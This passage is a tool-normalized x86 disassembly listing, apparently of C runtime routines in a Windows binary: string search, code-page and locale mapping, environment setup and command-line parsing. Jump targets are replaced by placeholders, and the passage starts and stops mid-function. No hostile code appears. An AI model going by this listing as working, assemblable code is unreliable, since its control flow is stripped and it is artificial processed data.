or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_4180be
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_4180ed
push ebx
push ebp
push esi
push edi
mov ebp 0x101
mov esi eax
push ebp
xor edi edi
lea ebx [ esi + 0x1c ]
push edi
push ebx
call sub_40fb30
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
xor eax eax
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax rw-data
add esp 0xc
sub eax esi
mov cl [ eax + ebx ]
mov [ ebx ] cl
inc ebx
dec ebp
jne r-xdata
lea ecx [ esi + 0x11d ]
mov esi 0x100
mov dl [ ecx + eax ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_418142
push ebp
lea ebp [ esp - 0x49c ]
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x498 ] eax
push ebx
push edi
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
mov edi 0x100
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x80 ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x80 ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax + 0x398 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x76 ]
test al al
mov [ ebp + 0x398 ] 0x20
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x68 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x1
push 0x0
call sub_41dd09
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x298 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_418df5
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x198 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_418df5
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x75 ]
mov edx [ ebp - 0x80 ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp + 0x498 ]
pop edi
xor ecx ebp
pop ebx
call sub_413965
add ebp 0x49c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax + 0x298 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx + 0x398 ]
push 0x20
push edx
call sub_40fb30
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax + 0x198 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x68 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_4182cc
push 0xc
push r--data
call sub_412340
call sub_4118e7
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418367
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_412385
retn
push 0x20
call sub_40e060
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_40fdab
pop ecx
sub_418370
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_410556
cmp esi 0xfffffffe
mov [ rw-data ] ebx
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4183ea
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_418370
mov edi eax
xor esi esi
cmp edi esi
mov [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_4180ed
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40fb30
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40fb30
xor edx edx
inc edx
add esp 0xc
cmp [ ebp - 0x18 ] edx
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
jbe r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_4180be
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
or eax 0xffffffff
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_418142
jmp r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4180be
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_418595
push 0x14
push r--data
call sub_412340
or [ ebp - 0x20 ] 0xffffffff
call sub_4118e7
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_4182cc
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_418370
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_413757
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_412385
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_4183ea
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_412089
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40fdab
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_40fdab
pop ecx
push 0xd
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4186f6
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40fdab
pop ecx
sub_41874d
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xbc ]
xor ebp ebp
cmp eax ebp
push edi
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebp
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebp
je r-xdata
push 0x6
lea edi [ esi + 0x50 ]
pop ebx
cmp [ eax + 0xb4 ] ebp
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40fdab
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40fdab
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40fdab
push [ esi + 0xc0 ]
call sub_40fdab
add esp 0x10
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x4 ] ebp
je r-xdata
mov eax [ edi ]
cmp eax ebp
je r-xdata
push eax
call sub_41dd49
push [ edi ]
call sub_40fdab
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebp
je r-xdata
add edi 0x10
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40fdab
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40fdab
pop ecx
push [ esi + 0xb0 ]
call sub_40fdab
push [ esi + 0xbc ]
call sub_40fdab
pop ecx
pop ecx
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40fdab
push [ esi + 0xbc ]
call sub_41df19
pop ecx
pop ecx
push eax
call sub_40fdab
pop ecx
push eax
call sub_40fdab
push [ esi + 0xbc ]
call sub_41ded9
pop ecx
pop ecx
sub_41888d
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ InterlockedIncrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
call edi
sub_418913
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
retn
push ebx
push ebp
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop ebp
pop ebx
push eax
call edi
sub_41899f
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_41888d
test esi esi
pop ecx
je r-xdata
push esi
call sub_418913
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_41874d
pop ecx
sub_4189dd
push 0xc
push r--data
call sub_412340
call sub_4118e7
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_41899f
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418a47
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_4118e7
mov esi [ eax + 0x6c ]
mov eax esi
call sub_412385
retn
push 0x20
call sub_40e060
pop ecx
sub_418a53
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov esi ecx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_41e0a8
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_413965
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_41e0ef
add esp 0x18
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40fdab
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_40fdab
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40e632
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
cmp ecx ebx
mov [ ebp - 0x8 ] ecx
je r-xdata
push eax
call sub_40fe88
cmp eax ebx
pop ecx
je r-xdata
call sub_413980
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_40fb30
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_41e0ef
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_40fe88
cmp eax ebx
pop ecx
je r-xdata
call sub_413980
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_40e632
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_40e632
pop ecx
cmp [ ebp + 0x1c ] ebx
push ebx
push ebx
jne r-xdata
push eax
call sub_40fe88
cmp eax ebx
pop ecx
je r-xdata
call sub_413980
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_418df5
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_418a53
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_418e52
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
cmp esi ebx
jne r-xdata
call sub_41872f
mov al [ esi ]
cmp al bl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_413797
mov edi eax
cmp edi ebx
pop ecx
pop ecx
mov [ rw-data ] edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_415b90
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebp
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
push esi
call sub_415b90
mov ebp eax
inc ebp
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_40fdab
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
add esi ebp
push 0x1
push ebp
call sub_413797
cmp eax ebx
pop ecx
pop ecx
mov [ edi ] eax
je r-xdata
push [ rw-data ]
call sub_40fdab
mov [ rw-data ] ebx
or eax 0xffffffff
jmp r-xdata
push esi
push ebp
push eax
call sub_415600
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebp
add edi 0x4
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411f2e
add esp 0x14
sub_418f2d
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
cmp [ ebp + 0x8 ] eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_41e2f2
test eax eax
pop ecx
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl bl
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
test eax eax
pop esi
pop ebx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edx edx
movsx eax al
push eax
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_41e2f2
test eax eax
pop ecx
je r-xdata
call sub_41e2f2
test eax eax
pop ecx
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_4190c5
push ebp
mov ebp esp
sub esp 0xc
push ebx
